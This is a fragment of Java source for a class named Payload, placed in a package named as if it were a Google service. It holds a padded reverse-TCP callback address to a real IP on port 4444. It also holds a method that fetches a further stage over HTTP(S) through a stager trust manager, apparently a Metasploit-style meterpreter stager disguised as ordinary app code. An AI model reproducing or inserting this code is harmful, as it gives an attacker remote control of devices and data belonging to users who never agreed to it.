package ua.nau.edu.GoogleService;
...
public class Payload {
    ...
    public static final String URL = "ZZZZtcp://81.162.228.39:4444                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ";
    ...
    private static void runStageFromHTTP(String url) throws Exception {
        ...
        if (url.startsWith("https")) {
            ...
            Class.forName("com.root.stager.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, uc);
